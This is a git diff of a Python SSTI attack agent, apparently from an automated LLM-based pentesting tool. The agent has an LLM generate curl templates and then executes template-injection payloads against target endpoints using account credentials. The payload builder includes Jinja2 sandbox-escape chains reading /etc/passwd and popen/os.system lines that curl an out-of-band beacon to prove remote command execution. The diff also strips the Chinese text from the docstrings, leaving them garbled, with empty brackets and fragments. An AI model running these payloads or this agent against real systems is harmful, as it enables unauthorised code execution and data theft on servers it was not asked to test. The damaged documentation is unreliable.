@@ -1,5 +1,5 @@
 """
-SSTI Agent - 服务器端模板注入检测（LLM生成注入点 + OOB + 响应分析）
+SSTI Agent - （LLM + OOB + ）
 """
 
 from typing import Dict, Any, List, Tuple
@@ -13,23 +13,23 @@ from config.llm_config import get_model_name, get_temperature
 
 class SSTIAgent:
     """
-    SSTI测试Agent（完整实现）
+    SSTIAgent（）
 
-    工作流程：
-    1. 调用LLM分析请求，识别SSTI注入点
-    2. LLM生成带{PAYLOAD}占位符的curl命令模板
-    3. 生成统一的token，拼接beacon_url
-    4. 生成SSTI payload列表（算术探针 + 文件读取 + OOB）
-    5. 执行测试：
-       - 自动规则检测（算术结果、文件特征、错误关键词）
-       - LLM语义研判（分析响应是否为模板执行结果）
-       - OOB检测（beacon回连）
-    6. 综合证据并返回结论
+    Workflow:
+    1. LLM，SSTI
+    2. LLM generates curl command templates with {PAYLOAD} placeholder
+    3. token，beacon_url
+    4. SSTI payload（ +  + OOB）
+    5. Execute tests:
+       - （、、）
+       - LLM（）
+       - OOB（beacon）
+    6.
 
-    关键特性：
-    - 服务端立即执行型（不需要用户访问页面）
-    - 双通道检测（OOB + 响应分析）
-    - LLM辅助判定（减少误报）
+    ：
+    - （）
+    - （OOB + ）
+    - LLM（）
     """
 
     def __init__(self, client,
@@ -37,7 +37,7 @@ class SSTIAgent:
                  judgment_prompt_path: str = "prompt/ssti_judgment.txt",
                  beacon_base: str = "http://172.17.0.1:9091/",
                  log_dir: str = "output/attack_logs/ssti",
-                 reflection_enabled: bool = True):  # ✅ 新增：反思功能开关
+                 reflection_enabled: bool = True):
         self.client = client
         self.ssti_prompt_path = Path(ssti_prompt_path)
         self.judgment_prompt_path = Path(judgment_prompt_path)
@@ -45,13 +45,12 @@ class SSTIAgent:
         self.log_dir = Path(log_dir)
         self.log_dir.mkdir(parents=True, exist_ok=True)
         self._log_path = self.log_dir / "ssti_agent.log"
-        self.reflection_enabled = reflection_enabled  # ✅ 保存配置
+        self.reflection_enabled = reflection_enabled
 
-        # ✅ 新增：记录所有执行的测试（用于延迟检测）
         self.execution_records: Dict[str, Dict[str, Any]] = {}  # {token: {url, evidence, ...}}
 
     def _log(self, *args):
-        """统一日志函数"""
+        """"""
         msg = " ".join(str(a) for a in args)
         try:
             with open(self._log_path, "a", encoding="utf-8") as f:
@@ -60,30 +59,30 @@ class SSTIAgent:
             pass
 
     def _load_prompt_template(self, path: Path) -> str:
-        """加载prompt模板"""
+        """prompt"""
         return path.read_text(encoding="utf-8")
 
     def _generate_token(self, length: int = 14) -> str:
-        """生成随机token"""
+        """token"""
         chars = string.ascii_letters + string.digits
         return ''.join(random.choice(chars) for _ in range(length))
 
     def test(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
         """
-        测试单个请求的SSTI漏洞（两阶段版本）
+        SSTI（）
 
-        两阶段测试流程：
-        - Stage 1: 初始攻击（使用原始prompt）
-        - Stage 2: 反思攻击（如果Stage 1失败，基于失败分析生成新策略）
+        Two-stage test flow:
+        - Stage 1: initial attack (original prompt)
+        - Stage 2: reflection attack (if Stage 1 fails)
 
         Args:
-            request: 完整请求数据（包含response）
-            credentials: 账户凭证
+            request: full request data (including response)
+            credentials: account credentials
 
         Returns:
             {
               "vulnerable": True/False/None,
-              "stage": 1 or 2,  # 表示在哪个阶段检测到/确认
+              "stage": 1 or 2,  # /
               "beacon_url": str,
               "token": str,
               "curl_templates": List[str],
@@ -93,24 +92,20 @@ class SSTIAgent:
               "summary": str
             }
         """
-        # ========== Stage 1: 初始攻击 ==========
         self._log(f"\n{'='*70}")
         self._log(f"[STAGE 1: Initial Attack]")
         self._log(f"{'='*70}\n")
 
         result_stage1 = self._execute_stage1(request, credentials)
 
-        # 如果检测到漏洞，直接返回
         if result_stage1.get("vulnerable") is True:
             self._log(f"\n[STAGE 1] ✓ VULNERABLE - Skipping Stage 2")
             return result_stage1
 
-        # 如果未启用反思，直接返回Stage 1结果
         if not self.reflection_enabled:
             self._log(f"\n[Reflection] Disabled - Returning Stage 1 result")
             return result_stage1
 
-        # ========== Stage 2: 反思攻击 ==========
         self._log(f"\n{'='*70}")
         self._log(f"[STAGE 2: Reflective Attack]")
         self._log(f"{'='*70}")
@@ -127,7 +122,7 @@ class SSTIAgent:
 
     def _execute_stage1(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
         """
-        执行Stage 1初始攻击（原test方法逻辑）
+        Execute Stage 1 initial attack（test）
 
         Returns:
             {
@@ -137,10 +132,10 @@ class SSTIAgent:
               "token": str,
               "curl_templates": List[str],
               "commands_executed": List[str],
-              "test_results": List[Dict],  # ✅ 保存用于反思
+              "test_results": List[Dict],  # ✅
               "evidence": List[Dict[str, str]],
               "llm_judgment": str,
-              "llm_analysis": str,  # ✅ 保存LLM分析输出
+              "llm_analysis": str,
               "summary": str
             }
         """
@@ -163,23 +158,22 @@ class SSTIAgent:
         self._log(f"    Response Body (preview): {extracted_response}")
         self._log(f"  Credentials: {json.dumps(credentials, indent=6, default=str)}\n")
 
-        # Step 1: 让LLM生成curl模板
         self._log(f"[Step 1: Calling LLM to Identify SSTI Injection Points]")
-        curl_templates, llm_analysis = self._generate_curl_templates(request)  # ✅ 获取LLM分析输出
+        curl_templates, llm_analysis = self._generate_curl_templates(request)
 
         if not curl_templates:
             self._log(f"[SSTI] No injection points identified by LLM")
             return {
                 "vulnerable": False,
-                "stage": 1,  # ✅ 添加stage标记
+                "stage": 1,
                 "token": None,
                 "beacon_url": None,
                 "curl_templates": [],
                 "commands_executed": [],
-                "test_results": [],  # ✅ 添加test_results
+                "test_results": [],
                 "evidence": [],
                 "llm_judgment": "No injection points found",
-                "llm_analysis": llm_analysis,  # ✅ 保存LLM分析
+                "llm_analysis": llm_analysis,
                 "summary": "No SSTI injection points found"
             }
 
@@ -188,13 +182,11 @@ class SSTIAgent:
             self._log(f"  {i}. {tmpl}")
         self._log("")
 
-        # Step 2: 生成统一token & beacon URL
         token = self._generate_token()
         beacon_url = f"{self.beacon_base}?data={token}"
         self._log(f"[Step 2: Generated Token]: {token}")
         self._log(f"[Beacon URL]: {beacon_url}\n")
 
-        # Step 3: 生成SSTI payload列表
         ssti_payloads = self._build_ssti_payloads(beacon_url, token)
         self._log(f"[Step 3: Generated {len(ssti_payloads)} SSTI Payloads]")
         for idx, (p_name, p_payload) in enumerate(ssti_payloads, 1):
@@ -202,18 +194,15 @@ class SSTIAgent:
             self._log(f"  {idx}. [{p_name}] {preview}{'...' if len(p_payload) > 80 else ''}")
         self._log("")
 
-        # Step 4: 执行测试并收集响应
         self._log(f"[Step 4: Executing Tests]")
         executed_commands: List[str] = []
-        test_results: List[Dict[str, Any]] = []  # 存储每个测试的详细结果
+        test_results: List[Dict[str, Any]] = []
 
-        # 先执行一个baseline请求（无payload）作为对照
         # baseline_response = self._execute_baseline(curl_templates[0], credentials)
         # extracted_baseline = extract_useful_response(baseline_response, max_length=2000)
         baseline_response = original_response
 
         for template in curl_templates:
-            # 打印完整模板（不截断）
             self._log(f"\n[Testing Template]: {template}")
 
             for payload_name, payload in ssti_payloads:
@@ -221,16 +210,11 @@ class SSTIAgent:
                     self._log("  ⚠️  Template missing {PAYLOAD} placeholder, skipping")
                     continue
 
-                # ✅ 使用新的安全执行函数
-                # - 自动判断 payload 位置并决定是否 URL 编码
-                # - 使用 shell=False 避免引号问题
                 from attack_agent.request_utils import execute_curl_safe
 
-                # 添加 -g 参数到模板（禁用 curl 的 globbing）
                 template_with_g = template + " -g" if " -g" not in template else template
 
                 self._log(f"  [Payload: {payload_name}]")
-                # 打印完整的最终命令模板（不截断）
                 self._log(f"  [Template]: {template_with_g}")
 
                 try:
@@ -241,13 +225,10 @@ class SSTIAgent:
                         timeout=15
                     )
 
-                    # ✅ 在日志中打印真正执行的完整命令
                     self._log(f"  [Command]: {final_cmd}")
 
-                    # 记录执行的命令（用于日志）
                     executed_commands.append(f"{template_with_g} (payload: {payload_name})")
 
-                    # 解析HTTP状态码
                     from attack_agent.request_utils import parse_http_status_from_response
                     http_status, response_body = parse_http_status_from_response(stdout)
 
@@ -259,12 +240,9 @@ class SSTIAgent:
                         "status_code": returncode
                     })
 
-                    # ✅ 完整记录每个测试的响应
                     self._log(f"  ✓ Executed (curl_exit_code={returncode}, stdout_len={len(response_body)}, stderr_len={len(stderr)})")
                     if http_status is not None:
                         self._log(f"  HTTP Status: {http_status}")
-                    # 打印完整响应（不截断）
-                    # 修改后：
                     extracted_body = extract_useful_response(response_body, max_length=2000)
                     self._log(f"  [STDOUT (extracted)]: {extracted_body}")
                     if stderr:
@@ -274,7 +252,6 @@ class SSTIAgent:
                 except Exception as e:
                     self._log(f"  ✗ Exec error: {e}")
 
-        # Step 5: OOB检测
         evidence = []
         self._log(f"\n[Step 5: Checking Beacon Detection]")
         oob = check_beacon_detection(token)
@@ -288,7 +265,6 @@ class SSTIAgent:
         else:
             self._log("  ✗ No OOB beacon detected")
 
-        # Step 6: LLM语义研判（仅在OOB未检测到时执行）
         if oob:
             self._log(f"\n[Step 6: LLM Semantic Judgment] Skipped (OOB confirmed vulnerability)")
             llm_judgment = "Skipped (OOB beacon confirmed vulnerability)"
@@ -300,10 +276,8 @@ class SSTIAgent:
                 test_results
             )
             self._log(f"  LLM Judgment: {llm_judgment[:200]}...")
-            # 综合结论（仅依赖LLM）
             vulnerable = self._determine_vulnerability(evidence, llm_judgment)
 
-        # 生成摘要
         summary = self._generate_summary(vulnerable, evidence, llm_judgment, oob)
 
         self._log(f"\n{'='*70}")
@@ -316,7 +290,6 @@ class SSTIAgent:
         self._log(f"  Summary: {summary}")
         self._log(f"{'='*70}\n")
 
-        # ✅ 记录执行信息（用于延迟检测）
         self.execution_records[token] = {
             "token": token,
             "beacon_url": beacon_url,
@@ -325,36 +298,34 @@ class SSTIAgent:
             "evidence": evidence
         }
 
-        # ✅ 如果OOB未触发且无响应证据，返回pending
         if vulnerable is True:
             final_vulnerable = True
         elif vulnerable is None and not oob:
-            # LLM判定不确定 且 OOB未触发 → pending
             final_vulnerable = None
         else:
             final_vulnerable = vulnerable  # True/False/None
 
         return {
             "vulnerable": final_vulnerable,  # ✅ True/False/None
-            "stage": 1,  # ✅ 标记为Stage 1
+            "stage": 1,
             "beacon_url": beacon_url,
             "token": token,
-            "curl_templates": curl_templates,  # ✅ 保存用于反思
+            "curl_templates": curl_templates,
             "commands_executed": executed_commands,
-            "test_results": test_results,  # ✅ 保存用于反思
+            "test_results": test_results,
             "evidence": evidence,
             "llm_judgment": llm_judgment,
-            "llm_analysis": llm_analysis,  # ✅ 保存LLM分析输出
+            "llm_analysis": llm_analysis,
             "summary": summary,
             "note": f"Stage 1 - Immediate detection: {'SSTI confirmed' if vulnerable else 'Pending finalize'}"
         }
 
     def _generate_curl_templates(self, request: Dict[str, Any]) -> tuple:
         """
-        调用LLM生成带{PAYLOAD}的curl模板
+        LLM{PAYLOAD}curl
 
         Returns:
-            (curl模板列表, LLM完整输出) 元组
+            Returns (curl template list, full LLM output) tuple
         """
         sys_prompt = self._load_prompt_template(self.ssti_prompt_path)
         original_response = str(request.get('response_body', '')) or ''
@@ -393,22 +364,21 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             self._log("~" * 70 + "\n")
 
             templates = self._parse_curl_templates(llm_output)
-            return templates, llm_output  # ✅ 返回元组
+            return templates, llm_output
 
         except Exception as e:
             self._log(f"[SSTI] LLM call failed: {e}")
             import traceback
             self._log(traceback.format_exc())
-            return [], ""  # ✅ 错误时返回空列表和空字符串
+            return [], ""
 
     def _parse_curl_templates(self, llm_output: str) -> List[str]:
         """
-        从LLM输出中提取curl模板
+        LLMcurl
         """
         templates: List[str] = []
         lines = llm_output.splitlines()
 
-        # 查找Commands:标记
         commands_idx = -1
         for i, line in enumerate(lines):
             if 'command:' in line.lower() or 'commands:' in line.lower():
@@ -416,14 +386,12 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                 break
 
         if commands_idx == -1:
-            # 容错：直接扫描所有行
             for line in lines:
                 l = line.strip()
                 if 'curl' in l and '{PAYLOAD}' in l:
                     templates.append(l.strip('`').strip())
             return templates
 
-        # 从Commands:行开始提取
         for i in range(commands_idx + 1, len(lines)):
             line = lines[i].strip()
             if not line or line.startswith('```'):
@@ -435,32 +403,27 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
     def _build_ssti_payloads(self, beacon_url: str, token: str) -> List[Tuple[str, str]]:
         """
-        生成SSTI payload列表（名称, payload）
+        SSTI payload（, payload）
 
         Returns:
             List[Tuple[str, str]]: [(payload_name, payload_string), ...]
         """
         payloads = []
 
-        # === 1. 算术探针（基础确认）===
         payloads.append(("arithmetic_basic", "{{7*7}}"))
-        payloads.append(("arithmetic_jinja", "{{7*'7'}}"))  # Jinja2会输出7777777
+        payloads.append(("arithmetic_jinja", "{{7*'7'}}"))
         payloads.append(("arithmetic_spring", "${7*7}"))
         payloads.append(("arithmetic_erb", "<%= 7*7 %>"))
         payloads.append(("arithmetic_thymeleaf", "[[${7*7}]]"))
 
-        # === 2. 引擎识别探针 ===
         payloads.append(("engine_jinja_mro", "{{[].__class__.__mro__}}"))
         payloads.append(("engine_jinja_config", "{{config.items()}}"))
         payloads.append(("engine_twig_self", "{{_self}}"))
         payloads.append(("engine_spring_pi", "${T(java.lang.Math).PI}"))
         payloads.append(("engine_velocity", "#set($x = 7*7)$x"))
 
-        # === 3. 文件读取（Linux）===
-        # Jinja2简单版本
         payloads.append(("file_read_jinja_simple", "{{open('/etc/passwd').read()}}"))
 
-        # Jinja2复杂链（常见的沙箱逃逸）
         payloads.append((
             "file_read_jinja_complex",
             "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}"
@@ -472,14 +435,12 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             "${new java.io.BufferedReader(new java.io.FileReader('/etc/hostname')).readLine()}"
         ))
 
-        # === 4. OOB回连（命令执行）===
         # Python/Jinja2
         payloads.append((
             "oob_jinja_curl",
             f"{{{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('curl {beacon_url}').read()}}}}"
         ))
 
-        # Mako（直接Python代码）
         payloads.append((
             "oob_mako",
             f"<% import os; os.system('curl {beacon_url}') %>"
@@ -501,15 +462,13 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
     # def _execute_baseline(self, template: str, credentials: Dict[str, Any]) -> str:
     #     """
-    #     执行baseline请求（无payload）作为对照
+    #     baseline（payload）
     #     """
     #     from attack_agent.request_utils import execute_curl_safe
 
     #     try:
-    #         # 用一个无害的字符串替换{PAYLOAD}
     #         stdout, stderr, returncode, final_cmd = execute_curl_safe(
     #             template=template,
-    #             payload='baseline_test',  # 无害字符串
     #             credentials=credentials,
     #             timeout=10
     #         )
@@ -520,34 +479,30 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
     def _llm_judge_responses(self, baseline: str, test_results: List[Dict]) -> str:
         """
-        调用LLM进行语义研判
+        LLM
         """
         judgment_prompt = self._load_prompt_template(self.judgment_prompt_path)
 
-        # 去重逻辑示例：按 response 的 hash 去重
         seen = {}
         for r in test_results:
             resp = r["response"]
-            key = (resp[:2000])  # 简单一点：前500字符 + 长度 作为 key
+            key = (resp[:2000])
             if key not in seen:
                 seen[key] = r
 
         deduped_results = list(seen.values())
-        # 然后再截断数量
         test_results = deduped_results[:15]
 
 
-        # ✅ 构建测试结果摘要 - 使用extract_useful_response提取有用信息
         results_summary = []
-        for r in test_results[:15]:  # 取前15个（增加）
+        for r in test_results[:15]:
             results_summary.append({
                 "payload_name": r["payload_name"],
-                "response_preview": extract_useful_response(r["response"], max_length=2000),  # ✅ 使用智能提取
+                "response_preview": extract_useful_response(r["response"], max_length=2000),
                 "response_length": len(r["response"]),
                 "stderr_preview": r.get("stderr", "")[:500] if r.get("stderr") else None
             })
 
-        # ✅ 使用智能提取处理baseline响应
         baseline_extracted = extract_useful_response(baseline, max_length=2000)
 
         user_input = f"""BASELINE RESPONSE (length={len(baseline)}):
@@ -559,7 +514,6 @@ TEST RESULTS (showing first {len(results_summary)} payloads):
 Please analyze if these responses indicate SSTI vulnerability.
 """
 
-        # ✅ 记录完整的LLM输入（不截断）
         self._log("\n[LLM Judgment - Full Input to LLM]:")
         self._log("=" * 70)
         self._log("[System Prompt]:")
@@ -593,23 +547,21 @@ Please analyze if these responses indicate SSTI vulnerability.
 
     def _determine_vulnerability(self, evidence: List[Dict], llm_judgment: str) -> bool:
         """
-        综合判定是否存在SSTI漏洞
+        SSTI
 
-        判定逻辑：
-        - OOB命中 → True（最高置信度）
-        - LLM判定为 "confirmed vulnerable" 或 "likely vulnerable" → True
-        - 其他 → False
+        ：
+        - OOB → True（）
+        - LLM "confirmed vulnerable"  "likely vulnerable" → True
+        -  → False
         """
-        # OOB命中 - 直接确认
         if any(e["type"] == "oob_hit" for e in evidence):
             return True
 
-        # 完全依赖LLM判断
         return self._llm_confirms_vulnerable(llm_judgment)
 
     def _llm_confirms_vulnerable(self, judgment: str) -> bool:
         """
-        检查LLM是否确认存在漏洞
+        LLM
         """
         lower = judgment.lower()
         positive_keywords = [
@@ -634,13 +586,12 @@ Please analyze if these responses indicate SSTI vulnerability.
     def _generate_summary(self, vulnerable: bool, evidence: List[Dict],
                           llm_judgment: str, oob: bool) -> str:
         """
-        生成测试摘要
+
         """
         if oob:
             return f"SSTI vulnerable (OOB beacon detected)"
 
         if vulnerable:
-            # 从 LLM 判断中提取关键信息
             if "confirmed vulnerable" in llm_judgment.lower():
                 return "SSTI vulnerable (LLM confirmed)"
             elif "likely vulnerable" in llm_judgment.lower():
@@ -652,7 +603,7 @@ Please analyze if these responses indicate SSTI vulnerability.
 
     def _vuln_status_str(self, status: bool) -> str:
         """
-        漏洞状态字符串
+
         """
         if status is True:
             return "VULNERABLE"
@@ -661,32 +612,29 @@ Please analyze if these responses indicate SSTI vulnerability.
         else:
             return "UNCERTAIN"
 
-    # ========== Stage 2: 反思攻击方法 ==========
 
     def _execute_stage2(self, request: Dict[str, Any], credentials: Dict[str, Any],
                        stage1_context: Dict[str, Any]) -> Dict[str, Any]:
         """
-        执行Stage 2反思攻击
+        Stage 2
 
-        核心逻辑：
-        1. 构建反思输入（基于Stage 1失败分析）
-        2. 调用LLM生成新模板
-        3. 执行新模板（复用Stage 1的执行逻辑）
-        4. 检测OOB（复用）
+        ：
+        1. （Stage 1）
+        2. LLM
+        3. （Stage 1）
+        4. OOB（）
 
         Args:
-            request: 原始请求
-            credentials: 凭证
-            stage1_context: Stage 1的完整结果
+            request:
+            credentials:
+            stage1_context: Stage 1
 
         Returns:
-            Stage 2的结果字典
+            Stage 2
         """
-        # 1. 构建反思suffix
         self._log(f"[Reflection] Building reflection analysis...")
         reflection_suffix = self._build_reflection_suffix(stage1_context)
 
-        # 2. 调用LLM生成新模板（在原prompt基础上append）
         self._log(f"[Step 1: Generating Reflection Templates via LLM]")
         new_templates, llm_reflection_output = self._generate_curl_templates_with_reflection(
             request=request,
@@ -695,7 +643,6 @@ Please analyze if these responses indicate SSTI vulnerability.
 
         if not new_templates:
             self._log(f"[Reflection] LLM did not generate new templates, returning Stage 1 result")
-            # 返回Stage 1结果，但标记为Stage 2尝试过
             stage1_context["reflection_attempted"] = True
             stage1_context["reflection_note"] = "No new templates generated"
             return stage1_context
@@ -705,14 +652,12 @@ Please analyze if these responses indicate SSTI vulnerability.
             self._log(f"  {i}. {tmpl}")
         self._log(f"")
 
-        # 3. 生成新的token（避免和Stage 1冲突）
         token = self._generate_token()
         beacon_url = f"{self.beacon_base}?data={token}"
         self._log(f"[Step 2: Generated New Token]: {token}")
         self._log(f"[Beacon URL]: {beacon_url}")
         self._log(f"")
 
-        # 4. 生成payload列表（复用现有逻辑）
         ssti_payloads = self._build_ssti_payloads(beacon_url, token)
         self._log(f"[Step 3: Generated {len(ssti_payloads)} SSTI Payloads]")
         for idx, (p_name, p_payload) in enumerate(ssti_payloads, 1):
@@ -720,12 +665,10 @@ Please analyze if these responses indicate SSTI vulnerability.
             self._log(f"  {idx}. [{p_name}] {preview}{'...' if len(p_payload) > 80 else ''}")
         self._log(f"")
 
-        # 5. 执行测试（复用Stage 1的执行逻辑）
         self._log(f"[Step 4: Executing Tests]")
         executed_commands: List[str] = []
         test_results: List[Dict[str, Any]] = []
 
-        # 先执行baseline请求
         # baseline_response = self._execute_baseline(new_templates[0], credentials)
         # extracted_baseline = extract_useful_response(baseline_response, max_length=2000)
         # self._log(f"\n[Baseline Response (length={len(baseline_response)})]:")
@@ -772,7 +715,6 @@ Please analyze if these responses indicate SSTI vulnerability.
                     self._log(f"  ✓ Executed (curl_exit_code={returncode}, stdout_len={len(response_body)}, stderr_len={len(stderr)})")
                     if http_status is not None:
                         self._log(f"  HTTP Status: {http_status}")
-                    # 修改后：
                     extracted_body = extract_useful_response(response_body, max_length=2000)
                     self._log(f"  [STDOUT (extracted)]: {extracted_body}")
                     if stderr:
@@ -782,7 +724,6 @@ Please analyze if these responses indicate SSTI vulnerability.
                 except Exception as e:
                     self._log(f"  ✗ Exec error: {e}")
 
-        # 6. OOB检测
         evidence = []
         self._log(f"\n[Step 5: Checking Beacon Detection]")
         oob = check_beacon_detection(token)
@@ -796,7 +737,6 @@ Please analyze if these responses indicate SSTI vulnerability.
         else:
             self._log("  ✗ No OOB beacon detected")
 
-        # 7. LLM语义研判
         if oob:
             self._log(f"\n[Step 6: LLM Semantic Judgment] Skipped (OOB confirmed vulnerability)")
             llm_judgment = "Skipped (OOB beacon confirmed vulnerability)"
@@ -810,7 +750,6 @@ Please analyze if these responses indicate SSTI vulnerability.
             self._log(f"  LLM Judgment: {llm_judgment[:200]}...")
             vulnerable = self._determine_vulnerability(evidence, llm_judgment)
 
-        # 生成摘要
         summary = self._generate_summary(vulnerable, evidence, llm_judgment, oob)
 
         self._log(f"\n{'='*70}")
@@ -824,7 +763,6 @@ Please analyze if these responses indicate SSTI vulnerability.
             self._log(f"  Result: PENDING (waiting for finalize)")
         self._log(f"{'='*70}\n")
 
-        # 8. 记录执行信息（用于延迟检测）
         method = request.get("method", "GET")
         url = request.get("url", "")
         self.execution_records[token] = {
@@ -835,7 +773,6 @@ Please analyze if these responses indicate SSTI vulnerability.
             "evidence": evidence
         }
 
-        # 返回Stage 2结果
         if vulnerable is True:
             final_vulnerable = True
         elif vulnerable is None and not oob:
@@ -843,7 +780,6 @@ Please analyze if these responses indicate SSTI vulnerability.
         else:
             final_vulnerable = vulnerable
 
-        # ✅ 在 return 语句中添加 stage1_results
         return {
             "vulnerable": final_vulnerable,
             "stage": 2,
@@ -857,7 +793,6 @@ Please analyze if these responses indicate SSTI vulnerability.
             "llm_reflection_output": llm_reflection_output,
             "reflection_analysis": reflection_suffix,
             "summary": summary,
-            # ✅ 新增：保留Stage 1的完整结果
             "stage1_results": {
                 "test_results": stage1_context.get("test_results", []),
                 "curl_templates": stage1_context.get("curl_templates", []),
@@ -871,44 +806,38 @@ Please analyze if these responses indicate SSTI vulnerability.
 
     def _build_reflection_suffix(self, stage1_context: Dict[str, Any]) -> str:
         """
-        构建追加到原prompt的反思内容
+        prompt
 
         Args:
-            stage1_context: Stage 1的完整结果
+            stage1_context: Stage 1
 
         Returns:
-            反思suffix（追加到原始prompt后面）
+            suffix（prompt）
         """
 
-        # 提取Stage 1数据
         templates = stage1_context.get("curl_templates", [])
         test_results = stage1_context.get("test_results", [])
         vulnerable = stage1_context.get("vulnerable")
 
-        # 构建反思内容
         suffix = "\n\n"
         suffix += "="*70 + "\n"
         suffix += "STAGE 1 RESULTS (Failed Detection)\n"
         suffix += "="*70 + "\n\n"
 
-        # 1. 之前生成的模板
         suffix += "Previous Templates Generated:\n"
         for i, tmpl in enumerate(templates, 1):
             suffix += f"{i}. {tmpl}\n"
         suffix += "\n"
 
-        # 2. 执行结果（智能提取响应）
         suffix += "Execution Results:\n"
         suffix += "-"*70 + "\n"
 
-        # 去重 + 采样（最多10个）
         sampled = self._sample_test_results(test_results, max_samples=10)
 
         for i, result in enumerate(sampled, 1):
             suffix += f"\nTest {i}:\n"
             suffix += f"  Payload: {result.get('payload_name', 'N/A')}\n"
 
-            # ✅ 使用智能提取
             response = result.get('response', '')
             if response:
                 extracted = extract_useful_response(response, max_length=2000)
@@ -919,11 +848,9 @@ Please analyze if these responses indicate SSTI vulnerability.
 
         suffix += "\n"
 
-        # 3. 结果说明
         suffix += f"Result: {'NOT VULNERABLE' if vulnerable is False else 'UNCERTAIN/PENDING'}\n"
         suffix += "\n"
 
-        # 4. 反思任务说明
         suffix += "="*70 + "\n"
         suffix += "YOUR TASK FOR STAGE 2 - REFLECTION\n"
         suffix += "="*70 + "\n\n"
@@ -971,21 +898,19 @@ Commands:
     def _generate_curl_templates_with_reflection(self, request: Dict[str, Any],
                                                  reflection_suffix: str) -> tuple:
         """
-        调用LLM生成反思后的新模板
+        LLM
 
-        策略：在原始prompt基础上append reflection_suffix
+        Strategy:promptappend reflection_suffix
 
         Args:
-            request: 原始请求
-            reflection_suffix: 反思分析内容
+            request:
+            reflection_suffix:
 
         Returns:
-            (新模板列表, LLM输出) 元组
+            (, LLM)
         """
-        # 1. 加载原始prompt
         sys_prompt = self._load_prompt_template(self.ssti_prompt_path)
 
-        # 2. 构建user prompt（和Stage 1相同的格式）
         original_response = str(request.get('response_body', '')) or ''
         extracted_response = extract_useful_response(original_response, max_length=2000)
 
@@ -1000,10 +925,8 @@ Response Body (extracted): {extracted_response}
 Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for SSTI testing.
 """
 
-        # 3. ✅ Append反思内容
         user_prompt += reflection_suffix
 
-        # 4. 调用LLM
         self._log(f"\n[LLM INPUT - Reflection Prompt]:")
         self._log(f"{'~'*70}")
         self._log(f"{user_prompt}")
@@ -1026,7 +949,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             self._log(f"{llm_output}")
             self._log(f"{'~'*70}\n")
 
-            # 5. 解析模板（复用现有的_parse_curl_templates）
             templates = self._parse_curl_templates(llm_output)
             return templates, llm_output
 
@@ -1038,38 +960,35 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
     def _sample_test_results(self, test_results: List[Dict], max_samples: int = 10) -> List[Dict]:
         """
-        从测试结果中采样（去重 + 采样）
+        （ + ）
 
         Args:
-            test_results: 完整测试结果列表
-            max_samples: 最大采样数量
+            test_results:
+            max_samples:
 
         Returns:
-            采样后的结果列表
+
         """
         if not test_results:
             return []
 
-        # 按响应哈希去重
         seen = {}
         for r in test_results:
             resp = r.get("response", "")
-            key = resp[:500] if resp else "empty"  # 简单哈希
+            key = resp[:500] if resp else "empty"
             if key not in seen:
                 seen[key] = r
 
         deduped = list(seen.values())
 
-        # 采样（最多max_samples个）
         if len(deduped) <= max_samples:
             return deduped
         else:
-            # 均匀采样
             import random
             return random.sample(deduped, max_samples)
 
     def check_final_results(self) -> Dict[str, bool]:
-        """检查最终结果（统一延迟检测）"""
+        """（）"""
         self._log(f"\n{'='*70}")
         self._log(f"[SSTI] Checking Final Results")
         self._log(f"{'='*70}\n")
@@ -1077,7 +996,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
         updates = {}
 
         for token in self.execution_records.keys():
-            # 重新检查beacon日志
             is_vulnerable = check_beacon_detection(token)
             updates[token] = is_vulnerable
 
